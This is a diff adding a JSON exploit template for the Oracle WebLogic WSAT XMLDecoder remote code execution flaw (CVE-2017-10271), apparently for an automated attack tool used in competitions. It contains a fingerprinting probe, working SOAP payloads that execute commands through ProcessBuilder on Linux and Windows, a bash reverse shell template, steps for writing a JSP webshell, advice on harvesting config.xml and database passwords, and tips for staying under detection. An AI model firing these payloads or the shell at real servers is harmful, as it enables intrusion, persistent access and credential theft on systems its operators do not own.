@@ -1,0 +1,130 @@
+{
+  "id": "weblogic-cve-2017-10271-wsat-rce",
+  "family": "weblogic",
+  "product": "Oracle WebLogic",
+  "cve": "CVE-2017-10271",
+  "aliases": [
+    "WebLogic WSAT XMLDecoder RCE"
+  ],
+  "severity": "critical",
+  "tags": [
+    "weblogic",
+    "wsat",
+    "soap",
+    "xmldecoder",
+    "rce"
+  ],
+  "applicability": {
+    "versions": [
+      "10.3.6.0",
+      "12.1.3.0",
+      "12.2.1.1",
+      "12.2.1.2"
+    ],
+    "fingerprints": [
+      "WebLogic banners, login pages, or /console assets",
+      "/wls-wsat/CoordinatorPortType or related WSAT endpoints reachable",
+      "SOAP endpoints accept WorkContext XML"
+    ],
+    "signals": [
+      "POST to WSAT endpoint returns SOAP fault or HTTP 500 instead of 404",
+      "WorkContext blocks are parsed instead of rejected at the edge",
+      "Target is an older WebLogic line with WSAT enabled"
+    ]
+  },
+  "preconditions": [
+    "The vulnerable WSAT component must be reachable from the current path.",
+    "The endpoint must process WorkContext XMLDecoder content.",
+    "An execution side-channel or output observation path should exist before trying multi-stage payloads."
+  ],
+  "verification": {
+    "method": "http_post",
+    "requests": [
+      {
+        "path": "/wls-wsat/CoordinatorPortType",
+        "method": "POST",
+        "headers": {
+          "Content-Type": "text/xml",
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Header><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java version=\"1.8\" class=\"java.beans.XMLDecoder\"><string>weblogic-probe</string></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>",
+        "matchers": [
+          "SOAP fault or HTTP 500 proving WorkContext is parsed",
+          "Not a 404 / static page response"
+        ]
+      }
+    ]
+  },
+  "exploitation": {
+    "mode": "rce",
+    "requests": [
+      {
+        "path": "/wls-wsat/CoordinatorPortType",
+        "method": "POST",
+        "headers": {
+          "Content-Type": "text/xml",
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Header><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java class=\"java.beans.XMLDecoder\"><object class=\"java.lang.ProcessBuilder\"><array class=\"java.lang.String\" length=\"3\"><void index=\"0\"><string>/bin/sh</string></void><void index=\"1\"><string>-c</string></void><void index=\"2\"><string>id</string></void></array><void method=\"start\"/></object></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>",
+        "os_hint": "linux"
+      },
+      {
+        "path": "/wls-wsat/CoordinatorPortType",
+        "method": "POST",
+        "headers": {
+          "Content-Type": "text/xml",
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Header><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java class=\"java.beans.XMLDecoder\"><object class=\"java.lang.ProcessBuilder\"><array class=\"java.lang.String\" length=\"3\"><void index=\"0\"><string>cmd.exe</string></void><void index=\"1\"><string>/c</string></void><void index=\"2\"><string>whoami</string></void></array><void method=\"start\"/></object></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>",
+        "os_hint": "windows"
+      }
+    ]
+  },
+  "post_exploitation": {
+    "stabilization": [
+      "先确认 WebLogic 运行用户、domain 路径、临时目录和管理面可达性。",
+      "优先收集 config.xml、jdbc 配置、数据源密码和部署列表，而不是持续用 XMLDecoder 打命令。",
+      "如果写文件或部署路径明确，可考虑更稳定的 JSP、WAR 或管理会话复用。"
+    ],
+    "shell_options": [
+      {
+        "type": "bash_reverse_shell",
+        "template": "Replace id with /bin/sh -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' inside ProcessBuilder payload"
+      },
+      {
+        "type": "jsp_webshell_write",
+        "template": "After locating writable deployment path, write or deploy {name}.jsp under an existing application context"
+      }
+    ]
+  },
+  "stability": {
+    "preferred_order": [
+      "先验证 WSAT endpoint 是否存在且会解析 WorkContext。",
+      "再做最小命令执行验证。",
+      "命中后优先切换到配置、凭据、部署管理等更稳定路径。"
+    ],
+    "safe_commands": [
+      "id",
+      "whoami",
+      "pwd",
+      "hostname",
+      "ls"
+    ],
+    "shell_prerequisites": [
+      "确认 SOAP endpoint 可从当前网络位置访问。",
+      "确认目标不会因为一次失败的 XMLDecoder 触发立即封堵。"
+    ],
+    "fallbacks": [
+      "如果 WSAT 关闭，转向 console、T3、IIOP、管理端口或已暴露应用面。",
+      "如果回显不可见，可结合时间延迟、日志、文件写入或管理界面 side-channel 验证。"
+    ]
+  },
+  "detection_notes": [
+    "WSAT 链的特征非常明显，应该用最少次数完成验证和稳定化。",
+    "比赛环境中若无必要，不要对多个 WSAT endpoint 重复发完整 ProcessBuilder 载荷。"
+  ],
+  "references": [
+    "Oracle advisory for CVE-2017-10271",
+    "Public WebLogic WSAT XMLDecoder proof-of-concept analyses"
+  ]
+}
